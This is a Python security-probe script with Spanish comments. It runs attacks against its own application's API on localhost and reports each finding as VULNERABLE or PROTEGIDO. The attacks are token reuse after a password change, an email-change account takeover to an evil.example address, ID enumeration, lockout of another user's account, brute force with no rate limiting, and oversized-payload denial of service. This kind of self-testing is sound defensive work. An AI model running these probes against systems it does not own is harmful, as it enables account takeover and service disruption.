#!/usr/bin/env python3
"""Sondas de ataque reproducibles contra la API (solo contra la propia aplicación, en local).

Uso:   python docs/security/evidence/security_probe.py [BASE_URL]      (por defecto http://localhost:8000)
Cada sonda imprime `V#  <ataque>  ->  <resultado observado>  [VULNERABLE|PROTEGIDO]`.
Las IPs de "atacante" y "víctima" son 127.0.0.x distintas (Linux enruta todo 127/8 a loopback), así se puede
demostrar el bloqueo de cuentas ajenas sin salir de la máquina.
"""
from __future__ import annotations

import sys
import time
import uuid

import requests
from requests.adapters import HTTPAdapter

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
PASSWORD = "ValidPass123"
results: list[tuple[str, bool]] = []


class FromIP(HTTPAdapter):
    """Sesión que sale desde una IP de origen concreta."""

    def __init__(self, ip: str):
        self.ip = ip
        super().__init__()

    def init_poolmanager(self, *args, **kwargs):
        kwargs["source_address"] = (self.ip, 0)
        super().init_poolmanager(*args, **kwargs)


def client(ip: str) -> requests.Session:
    session = requests.Session()
    session.mount("http://", FromIP(ip))
    return session


def report(vuln: str, attack: str, observed: str, vulnerable: bool) -> None:
    results.append((vuln, vulnerable))
    print(f"{vuln:<4} {attack:<62} -> {observed:<34} [{'VULNERABLE' if vulnerable else 'PROTEGIDO'}]")


def register(session, email: str) -> None:
    session.post(f"{BASE}/users", json={"email": email, "password": PASSWORD, "name": "Probe"}, timeout=30).raise_for_status()


def login(session, email: str, password: str = PASSWORD):
    return session.post(f"{BASE}/auth/login", json={"email": email, "password": password}, timeout=30)


def auth(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


tag = uuid.uuid4().hex[:8]

# V1 · el token robado sobrevive al cambio de contraseña (A07)
s = client("127.0.0.11")
email = f"v1-{tag}@example.com"
register(s, email)
stolen = login(s, email).json()["access_token"]
s.post(f"{BASE}/auth/change-password", json={"current_password": PASSWORD, "new_password": "NuevaClave456"}, headers=auth(stolen), timeout=30)
code = s.get(f"{BASE}/auth/me", headers=auth(stolen), timeout=30).status_code
report("V1", "token robado tras el cambio de contraseña (GET /auth/me)", f"HTTP {code}", code == 200)

# V2 · cambio de email sin reautenticar = toma de cuenta persistente (A07/A01)
s = client("127.0.0.12")
email = f"v2-{tag}@example.com"
register(s, email)
token = login(s, email).json()["access_token"]
uid = next(u for u in range(1, 500) if s.get(f"{BASE}/users/{u}", headers=auth(token), timeout=30).status_code == 200)
code = s.put(f"{BASE}/users/{uid}", json={"email": f"atacante-{tag}@evil.example"}, headers=auth(token), timeout=30).status_code
report("V2", "PUT /users/{id} con solo el token, cambiando el email", f"HTTP {code}", code == 200)

# V3 · contraseña sin tope de longitud: 500 sin autenticar y coste de CPU (A04)
s = client("127.0.0.13")
t0 = time.time()
code = s.post(f"{BASE}/users", json={"email": f"v3-{tag}@example.com", "password": "A1" + "a" * 5_000_000, "name": "x"}, timeout=60).status_code
report("V3", "POST /users con contraseña de 5 MB (sin autenticar)", f"HTTP {code} en {time.time() - t0:.2f}s", code >= 500)
code = login(s, f"v3-{tag}@example.com", "A1" + "a" * 5_000_000).status_code
report("V3b", "POST /auth/login con contraseña de 5 MB", f"HTTP {code}", code >= 500)

# V4 · un atacante bloquea la cuenta de la víctima desde otra IP (A07/A04)
victim, attacker, owner = f"v4-{tag}@example.com", client("127.0.0.14"), client("127.0.0.15")
register(owner, victim)
for _ in range(6):
    login(attacker, victim, "adivinando-mal")
code = login(owner, victim).status_code  # el dueño, desde SU IP y con SU contraseña correcta
report("V4", "5 fallos desde 127.0.0.14; el dueño (127.0.0.15) entra bien", f"HTTP {code}", code == 429)

# V5 · sin rate limit en endpoints sensibles (A04/A07)
s = client("127.0.0.16")
email = f"v5-{tag}@example.com"
register(s, email)
token = login(s, email).json()["access_token"]
codes = [s.post(f"{BASE}/auth/change-password", json={"current_password": f"mala{i}-xxxx", "new_password": "OtraClave789"}, headers=auth(token), timeout=30).status_code for i in range(30)]
report("V5a", "30 intentos de /auth/change-password con contraseña actual errónea", f"429 en {codes.count(429)}/30", 429 not in codes)
s = client("127.0.0.17")
codes = [s.post(f"{BASE}/auth/reset-password", json={"token": f"t{i}" * 8, "new_password": "OtraClave789"}, timeout=30).status_code for i in range(40)]
report("V5b", "40 intentos de /auth/reset-password con tokens al azar", f"429 en {codes.count(429)}/40", 429 not in codes)
s = client("127.0.0.18")
codes = [s.post(f"{BASE}/telemetry/events", json={"events": []}, timeout=30).status_code for i in range(300)]
report("V5c", "300 POST /telemetry/events sin autenticar en pocos segundos", f"429 en {codes.count(429)}/300", 429 not in codes)

# V6 · sin tope de tamaño del cuerpo (A04): se lee entero en memoria antes de validar
s = client("127.0.0.19")
code = s.post(f"{BASE}/telemetry/events", data=b"x" * 20_000_000, headers={"Content-Type": "application/json"}, timeout=60).status_code
report("V6", "POST /telemetry/events con cuerpo de 20 MB", f"HTTP {code}", code != 413)

print(f"\n{sum(1 for _, v in results if v)} vulnerables / {len(results)} sondas")
sys.exit(1 if any(v for _, v in results) else 0)
